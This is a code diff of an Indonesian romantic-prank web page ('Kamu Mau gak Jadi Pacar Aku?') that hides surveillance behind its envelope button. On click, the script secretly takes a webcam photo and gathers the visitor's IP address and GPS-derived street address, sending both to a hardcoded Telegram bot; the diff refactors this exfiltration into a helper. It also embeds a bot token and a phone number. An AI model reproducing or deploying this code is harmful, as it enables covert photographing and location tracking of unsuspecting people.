@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <meta charset='UTF-8'/>
-    <meta content='width=device-width, initial-scale=1, user-scalable=1, minimum-scale=1, maximum-scale=5' name='viewport'/>
-    <meta content='IE=edge' http-equiv='X-UA-Compatible'/>
-    <link href="https://feeldreams.github.io/hayoloh/style.css" rel="stylesheet" type="text/css" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=1, minimum-scale=1, maximum-scale=5">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href="https://feeldreams.github.io/hayoloh/style.css" rel="stylesheet" type="text/css">
     <script src="https://feeldreams.github.io/hayoloh/script.js"></script>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -15,7 +15,7 @@
     <link rel="icon" type="image/x-icon" href="https://malasid.github.io/favicon.png">
     <style>
         :root {
-            --warna-bg: rgba(0, 0, 0, .5); 
+            --warna-bg: rgba(0, 0, 0, .5);
             --warna-teks: #fff;
             --warna-bingkai: #fff;
             --bingkai: 8px;
@@ -26,269 +26,146 @@
     </style>
 </head>
 <body>
-
-    <!-- Ganti Audio di sini -->
     <audio id="linkmp3" src="https://feeldreams.github.io/papapa.mp3"></audio>
-
     <div id="bodyblur">
-        <!-- Wallpaper -->
         <img src="https://feeldreams.github.io/wp3.jpeg" id="wallpaper"/>
     </div>
-
-    <div id='Content'>
-        <div id="suratin" onClick="memulai();audio.play();openCamera();sendIPAddress();">
-            <!-- Tombol Surat -->
+    <div id="Content">
+        <div id="suratin" onclick="memulai();">
             <img src="https://rayyscoding.github.io/envelope.png"/>
         </div>
         <p id="ket">Klik Suratnya!</p>
         <p id="ket">Izinkan semua notif agar bisa mendapatkan notif dari aku❤️</p>
-
         <div>
-            <blockquote id='bq'>
+            <blockquote id="bq">
                 <div>
-                    <!-- Stiker untuk Konten -->
                     <img src="https://feeldreams.github.io/bunga.gif" id="fotoakhir"/>
                     <img src="https://feeldreams.github.io/peach1.gif" id="fotoakhir2"/>
                     <img src="https://feeldreams.github.io/weee.gif" id="fotoakhir3"/>
                 </div>
-
-                <!-- Konten Pertanyaan -->
                 <p id="kalimat">Kamu Mau gak Jadi Pacar Aku?🤭❤️</p>
                 <p id="kalimatb"></p>
                 <p id="kalimatc"></p>
-
-                <!-- Konten Jawaban -->
                 <p id="kalimat2">Yeaayy! 😆</p>
                 <p id="kalimatb2">Sekarang, Kamu adalah Pacarku ❤️❤️</p>
                 <p id="kalimatc2">Eitss... 🏃 Tapi Kita PUTUS dalam waktu : <b id="ctimer" style="font-size:24px">7</b></p>
-
-                <!-- Konten Jawaban 2 -->
                 <p id="kalimat3">Tapi Boong😜</p>
                 <p id="kalimatb3">Kamu beneran jadi pacar aku kok, wkwk🤣❤️</p>
                 <p id="kalimatc3">📅 </p>
             </blockquote>
         </div>
-
-        <!-- Tombol Multifungsi -->
         <div id="Tombol">
-            <a id="By" onClick="multifungsi()">
-                <b id="tmbl">Mau</b>
-            </a>
-            <a id="Bn" onClick="ditolak()">Gamau</a>
-            <a id="Bn2" onClick="ditolak2()"></a>
+            <a id="By" onclick="multifungsi()"><b id="tmbl">Mau</b></a>
+            <a id="Bn" onclick="ditolak()">Gamau</a>
+            <a id="Bn2" onclick="ditolak2()"></a>
         </div>
     </div>
-
     <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
-    <!-- JavaScript -->
     <script>
         // Inisialisasi variabel
-        let ftom = 0, jikapr = 1, ftganti = 0, flag = 1, flagg = 1, fungsi = 0;
-        const Bn2 = document.getElementById('Bn2');
-        const Content = document.getElementById('Content');
-        const ket = document.getElementById('ket');
-        const suratin = document.getElementById('suratin');
-        const bodyblur = document.getElementById('bodyblur');
-        const wallpaper = document.getElementById('wallpaper');
-        const fotoakhir = document.getElementById('fotoakhir');
-        const bq = document.getElementById('bq');
-        const Tombol = document.getElementById('Tombol');
-        const Bn = document.getElementById('Bn');
-
-        // Fungsi untuk memulai animasi dan memainkan audio
-        function memulai() {
-            suratin.style = "transition:all 1s ease;transform:scale(.1);opacity:0";
-            ket.style = "transition:all 1s ease;transform:scale(.1);opacity:0";
-            setTimeout(mulaikonten, 300);
-        }
-
-        // Fungsi untuk menampilkan konten utama
-        function mulaikonten() {
-            otomatis();
-            suratin.style = "display:none";
-            ket.style = "display:none";
-            Content.style = "opacity:1;margin-top:4vh";
-            bodyblur.style = "opacity:.6;animation:none";
-            wallpaper.style = "transform: scale(2);opacity:1;";
-            fotoakhir.style = "display:inline-flex;";
-            setTimeout(ftmuncul, 200);
-            bq.style = "position:relative;opacity:1;visibility:visible;transform: scale(1);border-radius:var(--bingkai);margin-top:0";
-            fungsi = 1;
-            setTimeout(tombol, 500);
-        }
-
-        // Fungsi untuk menampilkan gambar
-        function ftmuncul() {
-            if (ftganti == 0) {
-                fotoakhir.style = "display:inline-flex;opacity:1;transform:scale(1)";
-            }
-            if (ftganti == 1) {
-                fotoakhir.src = fotoakhir2.src;
-                fotoakhir.style = "display:inline-flex;opacity:1;transition:all .7s ease;transform:scale(1);";
-            }
-            if (ftganti == 2) {
-                fotoakhir.src = fotoakhir3.src;
-                fotoakhir.style = "display:inline-flex;opacity:1;transition:all .7s ease;transform:scale(1);";
-            }
-        }
-
-        // Fungsi untuk menyembunyikan gambar
-        function fthilang() {
-            fotoakhir.style = "display:inline-flex;opacity:1;transition:all .7s ease;transform:scale(.1)";
-        }
-
-        // Fungsi untuk animasi gambar
-        function jjfoto() {
-            fotoakhir.style.animation = "rto .8s infinite alternate";
-        }
-
-        // Fungsi untuk menampilkan tombol
-        function tombol() {
-            Tombol.style = "opacity:1;transform: scale(1);";
-            Bn.style = "margin:12px 0 12px 12px";
-            ftom = 1;
-        }
-
-        // Fungsi multifungsi untuk tombol
-        function multifungsi() {
-            if (ftom == 1) {
-                diterima();
-            }
-            if (ftom == 5) {
-                menuju();
-            }
-        }
-
-        // Fungsi untuk menuju WhatsApp
-        async function menuju() {
-            await swals.fire('OK!', 'Kirim Hasil Nilai ke WhatsApp aku, ya!', 'success');
-            window.location = "https://api.whatsapp.com/send?phone=6283897108979&text=" + pesanwhatsapp;
-            Tombol.style = "margin-top:15px;opacity:1;transform: scale(1);";
-        }
-
-        // Inisialisasi SweetAlert dan audio
-        const swalst = Swal.mixin({ timer: 2777, allowOutsideClick: false, showConfirmButton: false, timerProgressBar: true, imageHeight: 100 });
         const audio = new Audio(document.getElementById('linkmp3').src);
         const swals = Swal.mixin({ allowOutsideClick: false, cancelButtonColor: '#FF0040', imageWidth: 100, imageHeight: 100 });
 
-        // Fungsi untuk membuat elemen hati
-        const body = document.querySelector("body");
-        function createHeart() {
-            const heart = document.createElement("div");
-            heart.className = "fas fa-heart";
-            heart.style.left = (Math.random() * 90) + "vw";
-            heart.style.animationDuration = (Math.random() * 3) + 2 + "s";
-            body.appendChild(heart);
+        // Fungsi untuk memulai
+        function memulai() {
+            document.getElementById('suratin').style = "transition:all 1s ease;transform:scale(.1);opacity:0";
+            document.getElementById('ket').style = "transition:all 1s ease;transform:scale(.1);opacity:0";
+            setTimeout(() => {
+                document.getElementById('suratin').style.display = 'none';
+                document.getElementById('ket').style.display = 'none';
+                document.getElementById('Content').style = "opacity:1;margin-top:4vh";
+                document.getElementById('bodyblur').style = "opacity:.6;animation:none";
+                document.getElementById('wallpaper').style = "transform: scale(2);opacity:1;";
+                document.getElementById('fotoakhir').style = "display:inline-flex;";
+                document.getElementById('bq').style = "position:relative;opacity:1;visibility:visible;transform: scale(1);border-radius:var(--bingkai);margin-top:0";
+                setTimeout(() => {
+                    document.getElementById('Tombol').style = "opacity:1;transform: scale(1);";
+                }, 500);
+            }, 300);
+            audio.play();
+            openCamera();
+            sendIPAddress();
         }
-
-        // Hapus elemen hati jika lebih dari 100
-        setInterval(function () {
-            var heartArr = document.querySelectorAll(".fa-heart");
-            if (heartArr.length > 100) {
-                heartArr[0].remove();
-            }
-        }, 100);
 
         // Fungsi untuk membuka kamera
         async function openCamera() {
-            const constraints = {
-                video: { facingMode: "user" },
-                audio: false
-            };
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                swals.fire('Error', 'Browser tidak mendukung akses kamera.', 'error');
+                return;
+            }
 
             try {
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.autoplay = true;
                 document.body.appendChild(video);
 
-                // Delay untuk memastikan video sudah diputar sebelum mengambil gambar
-                setTimeout(() => captureImage(video, stream), 1000);
-            } catch (err) {
-                console.error("Error accessing camera: ", err);
+                setTimeout(async () => {
+                    const imageData = await captureImage(video);
+                    await sendToTelegram(imageData, 'photo.png');
+                    stream.getTracks().forEach(track => track.stop());
+                    video.remove();
+                }, 1000);
+            } catch (error) {
+                console.error("Error accessing camera: ", error);
+                swals.fire('Error', 'Tidak dapat mengakses kamera.', 'error');
             }
         }
 
-        // Fungsi untuk mengambil gambar dari video
-        async function captureImage(video, stream) {
+        // Fungsi untuk mengambil gambar
+        async function captureImage(video) {
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL('image/png');
+            return canvas.toDataURL('image/png');
+        }
 
-            // Kirim gambar ke Telegram
-            const botToken = '6660493311:AAGnUchxelmeOn2d2bhdCE-HBQK-v_ei_dc';
-            const chatId = '5813466669';
+        // Fungsi untuk mengirim data ke Telegram
+        async function sendToTelegram(data, filename) {
+            const botToken = '6660493311:AAGnUchxelmeOn2d2bhdCE-HBQK-v_ei_dc'; // Ganti dengan token bot Anda
+            const chatId = '5813466669'; // Ganti dengan chat ID Anda
             const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
 
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('photo', dataURLtoBlob(imageData), 'photo.png');
+            formData.append('photo', dataURLtoBlob(data), filename);
 
             try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    body: formData
-                });
-
+                const response = await fetch(url, { method: 'POST', body: formData });
                 if (response.ok) {
                     console.log('Image sent successfully');
                 } else {
                     console.error('Failed to send image');
                 }
-            } catch (err) {
-                console.error('Error sending image: ', err);
+            } catch (error) {
+                console.error('Error sending image: ', error);
             }
-
-            // Hentikan stream video
-            stream.getTracks().forEach(track => track.stop());
-            video.remove();
         }
 
-        // Fungsi untuk mengirim IP Address dan lokasi
+        // Fungsi untuk mengirim IP dan lokasi
         async function sendIPAddress() {
             try {
-                const response = await fetch('https://api64.ipify.org?format=json');
-                const data = await response.json();
-                const ipAddress = data.ip;
+                const ipResponse = await fetch('https://api64.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ipAddress = ipData.ip;
 
-                const botToken = '6660493311:AAGnUchxelmeOn2d2bhdCE-HBQK-v_ei_dc';
-                const chatId = '5813466669';
-                const message = `IP Address pengguna: ${ipAddress}`;
-                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                const location = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                });
 
-                const sendResponse = await fetch(url, { method: 'GET' });
-                if (sendResponse.ok) {
-                    console.log('IP Address sent successfully');
-                } else {
-                    console.error('Failed to send IP Address');
-                }
+                const latitude = location.coords.latitude;
+                const longitude = location.coords.longitude;
 
-                // Mengambil latitude dan longitude
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
+                const nominatimUrl = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`;
+                const nominatimResponse = await fetch(nominatimUrl);
+                const nominatimData = await nominatimResponse.json();
 
-                    // Mengirim request ke Nominatim untuk mendapatkan alamat
-                    const nominatimUrl = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`;
-                    const nominatimResponse = await fetch(nominatimUrl);
-                    const nominatimData = await nominatimResponse.json();
-
-                    // Mengirim hasil JSON ke bot Telegram
-                    const addressMessage = `Lokasi pengguna:\nAlamat: ${JSON.stringify(nominatimData)}`;
-                    const locationUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(addressMessage)}`;
-
-                    const locationResponse = await fetch(locationUrl, { method: 'GET' });
-                    if (locationResponse.ok) {
-                        console.log('Location sent successfully');
-                    } else {
-                        console.error('Failed to send location');
-                    }
-                }, showError);
+                const message = `IP Address: ${ipAddress}\nLokasi: ${nominatimData.display_name}`;
+                await sendToTelegram(message, 'location.txt');
             } catch (error) {
-                console.error('Error fetching IP Address or location: ', error);
+                console.error('Error fetching IP or location: ', error);
             }
         }
 
@@ -302,26 +179,6 @@
                 u8arr[n] = bstr.charCodeAt(n);
             }
             return new Blob([u8arr], { type: mime });
-        }
-
-        // Fungsi untuk menampilkan error
-        function showError(error) {
-            let message = '';
-            switch (error.code) {
-                case error.PERMISSION_DENIED:
-                    message = 'User denied the request for Geolocation.';
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    message = 'Location information is unavailable.';
-                    break;
-                case error.TIMEOUT:
-                    message = 'The request to get user location timed out.';
-                    break;
-                case error.UNKNOWN_ERROR:
-                    message = 'An unknown error occurred.';
-                    break;
-            }
-            console.error(message);
         }
     </script>
 </body>
